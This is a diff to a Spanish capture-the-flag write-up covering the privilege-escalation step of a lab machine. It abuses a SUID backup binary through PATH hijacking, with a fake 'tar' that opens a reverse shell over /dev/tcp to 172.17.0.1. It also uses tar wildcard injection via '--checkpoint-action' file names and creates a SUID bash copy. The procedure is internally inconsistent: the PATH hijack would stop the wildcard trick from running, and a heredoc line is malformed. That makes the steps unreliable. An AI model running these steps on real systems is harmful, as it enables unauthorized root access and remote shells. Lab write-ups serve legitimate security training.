@@ -76,28 +76,98 @@ Ahora somos el usuario srv_backup.
 ## 👑 3. Escalada de Privilegios
 
 ### Enumeración del Sistema
+Ahora necesitamos escalar privilegios para ser root.
 Analizamos el entorno buscando vectores comunes de escalada (permisos SUID, tareas Cron, capacidades, contraseñas en texto plano).
 
 ```bash
-# Comprobamos privilegios de SUDO
-sudo -l
+# Comprobamos binarios
+find / -perm -4000 2>/dev/null
 ```
 
-<img src="./img/backup.png" width="70%">
+Tenemos un binario vulnerable, es /usr/local/bin/backup
+Lo lanzamos para ver que hace y vemos que crea un backup automático de todo lo que hay en la carpeta del usuario srv_backup.
 
+<img src="./img/backupDone.png" width="70%">
 
+Así que vamos a aprovecharlo para poder ser root.
 
 ### Explotación del Vector de Escalada
-Encontrado un binario o configuración débil. Explicar cómo se abusa de ello para convertirse en `root`.
+Encontrado el binario, vamos a explotarlo. Lo analizamos con strings y vemos que el binario crea un .tar de todo lo que hay en la ruta home y no lo hace con la ruta absoluta.
+
 
 ```bash
-# Ejemplo de explotación
-sudo /usr/bin/env /bin/sh
+# Podemos filtrar para verlo mejor
+strings /usr/local/bin/backup | grep -E '(/|cp|mv|tar|cat|chmod|chown|mkdir|rm|find|python|bash|sh)'
 ```
+Nos muestra:
+/lib64/ld-linux-x86-64.so.2
+__libc_start_main
+__gmon_start__
+tar -czf /tmp/backup.tar.gz /home/* 2>/dev/null
+__libc_start_main@GLIBC_2.34
+__data_start
+__gmon_start__
+__bss_start
+.shstrtab
+.gnu.hash
+
+Ahora que hemos visto lo que hace vamos a ver si podemos modificar el $PATH y poner primero la carpeta tmp, para que busque primero los ejecutables en /tmp, antes que en /usr/local/.
+
+export PATH=/tmp:$PATH
+
+Comprobamos que el cambio ha sido aceptado.
+¡Nos deja!
+
+Levantamos un listener en el puerto 442 y preparamos los archivos que aprovecharemos mediante las opciones de tar:
+
+touch /home/srv_backup/--checkpoint=1
+touch /home/srv_backup/--checkpoint-action=exec=sh\ run.sh
+
+A continuación, creamos un ejecutable llamado tar dentro de /tmp. De esta forma, debido al orden del $PATH, el sistema utilizará nuestro ejecutable antes que el tar legítimo.
+
+cat > tar <<'EOF' #!/bin/sh
+sh -i >& /dev/tcp/172.17.0.1/442 0>&1
+EOF
+
+Le damos permisos de ejecución:
+chmod +x /tmp/tar
+
+Creamos el script que copiará /bin/bash a /tmp/rootbash y le asignará el bit SUID:
+echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /home/srv_backup/run.sh
+
+Y le damos permisos de ejecución:
+chmod +x /home/srv_backup/run.sh
+
+
+Ahora ejecutamos el binario:
+
+/usr/local/bin/backup
+
+El binario vulnerable ejecuta internamente un comando similar a:
+
+tar -czf ... /home/*
+
+El * se expande antes de que tar reciba los argumentos, incluyendo nuestros archivos:
+
+--checkpoint=1
+--checkpoint-action=exec=sh run.sh
+
+Esto provoca que tar ejecute el script run.sh.
+
+Una vez finalizada la ejecución del backup, comprobamos si se ha creado correctamente /tmp/rootbash:
+ls -l /tmp/rootbash
+
+Si todo ha funcionado correctamente, podremos ejecutar la shell conservando los privilegios:
+/tmp/rootbash -p
+
+Con esto obtenemos una shell con privilegios elevados.
+
 
 <img src="./img/root.png" width="70%">
 
 ¡Ya somos **root**! 🚩
+
+En el fichero flag.txt tenemos la flag.
 
 ---
 
